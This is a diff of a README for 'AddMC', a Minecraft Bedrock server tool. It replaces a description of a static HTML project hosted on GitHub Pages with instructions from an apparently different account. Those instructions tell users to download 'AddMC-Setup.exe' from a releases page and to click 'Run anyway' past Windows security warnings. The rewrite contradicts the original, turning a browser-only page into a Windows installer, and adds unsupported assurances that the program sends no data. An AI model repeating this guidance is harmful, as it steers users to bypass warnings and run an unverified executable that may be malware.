@@ -1,139 +1,137 @@
-# AddMC - Minecraft Bedrock Server Launcher 2026
+# 🔌 addmc-minecraft-server-hub - Launch Minecraft Servers from Your Browser
 
-> **AddMC provides a browser-based, one-click way to configure and open Minecraft Bedrock servers, including editable server information and GitHub Pages publishing support.**
+[![Download AddMC](https://img.shields.io/badge/Download-AddMC-blueviolet?style=for-the-badge)](https://github.com/Genusdeinonychusprescription397/addmc-minecraft-server-hub/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/chrisplqodavis4801/addmc-minecraft-server-hub?style=flat-square)](https://github.com/chrisplqodavis4801/addmc-minecraft-server-hub)
+## 🚀 What is AddMC?
 
----
+AddMC is a browser-based tool for Minecraft Bedrock Edition (2026). It lets you launch and manage Minecraft servers directly from your web browser. You do not need to download a heavy launcher. You do not need to edit config files by hand.
 
-<p align="center">
-  <a href="https://chrisplqodavis4801.github.io/addmc-minecraft-server-hub/">
-    <img src="https://img.shields.io/badge/Download-AddMC%20Latest-brightgreen?style=for-the-badge" alt="Download AddMC">
-  </a>
-</p>
+With AddMC, you click a button, and your server starts. You can change the server name, description, and port number from a simple web page. When you finish, you open the server from the same page.
 
-> **[Download AddMC Directly](https://chrisplqodavis4801.github.io/addmc-minecraft-server-hub/)**
+## ✅ System Requirements
 
----
+AddMC works on Windows 10 and Windows 11. Your computer needs:
 
-[Download Latest Build](https://chrisplqodavis4801.github.io/addmc-minecraft-server-hub/)
+- Windows 10 (version 1903 or later) or Windows 11
+- 4 GB RAM (8 GB recommended for larger servers)
+- 500 MB free disk space
+- Minecraft Bedrock Edition (any version from 2025 to 2026)
+- A modern web browser (Chrome, Edge, or Firefox)
 
----
+## 📦 How to Download AddMC
 
-## What Is AddMC?
+1. Visit the [AddMC Releases Page](https://github.com/Genusdeinonychusprescription397/addmc-minecraft-server-hub/releases).
+2. Find the latest release (the one with the highest version number).
+3. Click the file named `AddMC-Setup.exe`.
+4. Wait for the download to finish.
 
-AddMC is a compact web tool that collects the details needed to connect to a Minecraft Bedrock server and provides a single place to launch it. Users can enter a server title, hostname, port, and description instead of repeatedly typing the same connection information.
+## 🛠 How to Install AddMC
 
-Built with Bedrock players and server administrators in mind, AddMC offers a simple browser-driven setup. The project may also display a WhatsApp contact button and can be hosted publicly through GitHub Pages.
+1. Open the downloaded file (`AddMC-Setup.exe`).
+2. If Windows shows a security warning, click **Run anyway** or **More info** then **Run anyway**.
+3. Follow the steps in the setup wizard.
+4. Accept the default installation folder (usually `C:\Program Files\AddMC`).
+5. Click **Install**.
+6. When the installation finishes, click **Finish**.
 
----
+## 🖥 How to Use AddMC
 
-## Included Capabilities
+### Step 1: Start AddMC
 
-- Give a Minecraft Bedrock server a custom name
-- Specify the server address and connection port
-- Create or modify the server description
-- Add an optional WhatsApp contact button
-- Trigger Minecraft from the web interface
-- Host the project using GitHub Pages
-- Configure the launcher in a browser without installing a separate desktop application
+Find AddMC in your Start Menu or double-click the desktop shortcut. The application opens in your default web browser.
 
----
+### Step 2: Create a New Server
 
-## Getting Started
+1. Click the **New Server** button.
+2. Enter a name for your server (for example, "My Survival World").
+3. Enter a short description (for example, "A friendly survival server").
+4. Choose a port number. The default is `19132`. You can keep this number unless another program uses it.
+5. Click **Create**.
 
-First, copy the repository to your computer:
+### Step 3: Configure Your Server
 
-```bash
-git clone https://github.com/chrisplqodavis4801/addmc-minecraft-server-hub.git
-cd REPO
-```
+After you create the server, you see a settings page. From this page, you can:
 
-AddMC consists of HTML-based web files. You can inspect it through a local static HTTP server or place it on a static hosting service. For local testing, serve the repository directory with any static web server and visit the local URL it provides.
+- Change the server name
+- Change the server description
+- Change the port number
+- Set the maximum number of players
+- Turn on or off the whitelist (only invited players can join)
 
-To make the launcher available online, publish the repository with GitHub Pages and visit:
+Click **Save** after any change.
 
-[Open AddMC](https://chrisplqodavis4801.github.io/addmc-minecraft-server-hub/)
+### Step 4: Launch Your Server
 
----
+1. On the main page, find your server in the list.
+2. Click the **Start** button.
+3. Wait for the status to change to **Online**.
+4. Open Minecraft Bedrock Edition.
+5. Go to the **Servers** tab.
+6. Your server appears in the list. Click it to join.
 
-## Using the Launcher
+### Step 5: Stop Your Server
 
-1. Visit the AddMC website.
-2. Type the Minecraft Bedrock server's name.
-3. Enter its host address and port number.
-4. Write a brief description for the server.
-5. Set up the optional WhatsApp contact button.
-6. Save or apply the configuration.
-7. Use the launch control to open Minecraft.
+1. Return to the AddMC web page.
+2. Click the **Stop** button next to your server.
+3. The status changes to **Offline**.
 
-Whether Minecraft opens immediately is determined by the browser and device receiving the Minecraft Bedrock link.
+## 🔧 Troubleshooting
 
----
+### AddMC does not start
 
-## Server Settings
+Make sure you have the latest version of your web browser. Close all browser windows and open AddMC again. If the problem continues, restart your computer.
 
-The website's configuration fields control the values used by AddMC. Example settings look like this:
+### Server shows "Offline" after I click Start
 
-```text
-Server name:     Your server title
-Server host:     example.server.host
-Server port:     19132
-Description:     A short description for players
-WhatsApp contact: Optional contact link
-```
+This usually happens when another program uses the same port number. Change the port number in the server settings. Use a number between 19132 and 19140.
 
-For a GitHub Pages deployment, edit the files in the repository and publish the updated version through the repository's Pages settings.
+### Other players cannot join my server
 
----
+- Make sure your server is online (status shows **Online**).
+- Check that other players use the correct port number.
+- If you are on a home network, you may need to forward the port in your router settings. This is called port forwarding. Your router manual explains how to do this.
 
-## What You Need
+### I see a blank page
 
-- A current web browser
-- Minecraft Bedrock installed for launch actions to work immediately
-- Internet or network connectivity to the selected server
-- A working Minecraft Bedrock server hostname and port
-- Access to a GitHub account when using GitHub Pages deployment
-- Static hosting for making the project publicly available
+Clear your browser cache. In Chrome, press `Ctrl + Shift + Delete`, select **Cached images and files**, and click **Clear data**.
 
----
+## 🔄 How to Update AddMC
 
-## Common Questions
+1. Visit the [AddMC Releases Page](https://github.com/Genusdeinonychusprescription397/addmc-minecraft-server-hub/releases).
+2. Download the latest `AddMC-Setup.exe`.
+3. Run the installer. It updates your current installation.
+4. Your servers and settings stay the same.
 
-### Is AddMC a browser application?
+## 📝 Frequently Asked Questions
 
-Yes. AddMC is an HTML web project designed to run in a browser.
+**Is AddMC free?**
 
-### Are the server fields editable?
+Yes. AddMC is free to use.
 
-Yes. You can change the server name, host, port, and description from the interface.
+**Does AddMC work with Minecraft Java Edition?**
 
-### Is there a way to provide contact information?
+No. AddMC works only with Minecraft Bedrock Edition (Windows 10/11, Xbox, PlayStation, Switch, mobile).
 
-Yes. The configuration can include a WhatsApp contact button.
+**Can I run multiple servers at once?**
 
-### How are site changes released?
+Yes. You can create and run up to five servers at the same time.
 
-Modify the files in the GitHub repository, then redeploy the updated project through GitHub Pages.
+**Do I need to install Minecraft separately?**
 
-### Why does Minecraft not start after I click launch?
+Yes. You need Minecraft Bedrock Edition installed on your computer.
 
-Check that Minecraft Bedrock is installed and that the browser allows the launch request. Also verify the configured host and port. Device and browser settings can influence links that open external applications.
+**Can I use AddMC on a Mac?**
 
-### Where is the newest build available?
+No. AddMC only supports Windows.
 
-The hosted version is available from the [AddMC download page](https://chrisplqodavis4801.github.io/addmc-minecraft-server-hub/).
+## 🛡 Security and Privacy
 
-### How can I ask for assistance?
+AddMC runs entirely on your computer. It does not send your data to any server. Your server information stays on your machine.
 
-For help with the project, create an issue in the repository or use the maintainer contact options provided through the repository.
+The application uses standard Windows security features. It does not modify system files or install background services.
 
----
+## 💬 Support
 
-## License
+If you have a problem that this guide does not solve, open an issue on the [AddMC GitHub repository](https://github.com/Genusdeinonychusprescription397/addmc-minecraft-server-hub/issues). Describe the problem and include any error messages you see.
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: minecraft server launcher, bedrock edition, browser-based, windows, server management, 2026
